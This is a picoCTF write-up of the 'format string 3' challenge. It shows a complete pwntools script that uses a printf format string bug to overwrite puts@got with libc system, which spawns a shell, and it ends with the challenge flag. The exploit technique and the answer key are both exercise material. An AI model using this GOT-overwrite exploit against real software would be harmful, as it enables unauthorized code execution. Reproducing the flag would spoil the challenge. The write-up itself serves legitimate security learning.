# format string 3
> Write-up author: jon-brandy

## DESCRIPTION:
<p align="justify">This program doesn't contain a win function. How can you win? Download the binary here. Download the source here. Download libc here, download the interpreter here. Run the binary with these two files present in the same directory.

Additional details will be available after launching your challenge instance.</p>

## HINT:
Is there any way to change what a function points to?

## STEPS:
1. In this challenge we're given both the source code and the binary.
2. The binary is 64 bit LSB, dynamically linked, and not stripped.

![image](https://github.com/jon-brandy/CTF-WRITE-UP/assets/70703371/aeb18692-e6df-4e6e-8fb3-2a58970dfce1)

> BINARY PROTECTIONS

![image](https://github.com/jon-brandy/CTF-WRITE-UP/assets/70703371/501481c6-f188-47a8-88f1-381af3a42538)

3. Upon reviewing the source code, the challenge is very straightforward.
4. The binary is **Partial RELRO** and there's a **printf()** usage which missing it's format specifier, hence introducing FSB (Format String Bug).
5. At next LOC, a **puts()** called and `/bin/sh` string used as the argument.
6. Our objective is to overwrite `puts@got` with `libc.sym.system`. It shall gets us a shell --> `system("/bin/sh")`.
7. Now let's identify which `function@got` can be overwritten.

> IN GDB

![image](https://github.com/jon-brandy/CTF-WRITE-UP/assets/70703371/48b9bbb5-75a3-4a82-96f6-f6707e3e8456)

8. Nice! `puts@got` can be overwritten.
9. Now let's find the offset.

> RESULT

![image](https://github.com/jon-brandy/CTF-WRITE-UP/assets/70703371/e1d98173-dfb9-492a-96da-f9b7a0e08d66)


10. To overwrite the GOT, I used `fmtstr_payload`, here's the full script:

> FULL SCRIPT

```py
from pwn import * 

exe = './format-string-3'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'INFO'

library = './libc.so.6'
libc = context.binary = ELF(library, checksec=False)

# sh = process(exe)
sh = remote('rhea.picoctf.net', 58943)

sh.recvuntil(b'libc: ')
get = sh.recvline().strip()
get = eval(get)
info(f'LIBC LEAK --> {hex(get)}')

libc.address = get - libc.sym['setvbuf']
info(f'LIBC BASE --> {hex(libc.address)}')

payload = fmtstr_payload(38, {elf.got['puts']:libc.sym['system']})
sh.sendline(payload)

sh.interactive()
```

> RESULT

![image](https://github.com/jon-brandy/CTF-WRITE-UP/assets/70703371/8632e711-0d0e-421b-af65-27f87106a9bf)

11. We got the flag!

## FLAG:

```
picoCTF{G07_G07?_cf6cb591}
```
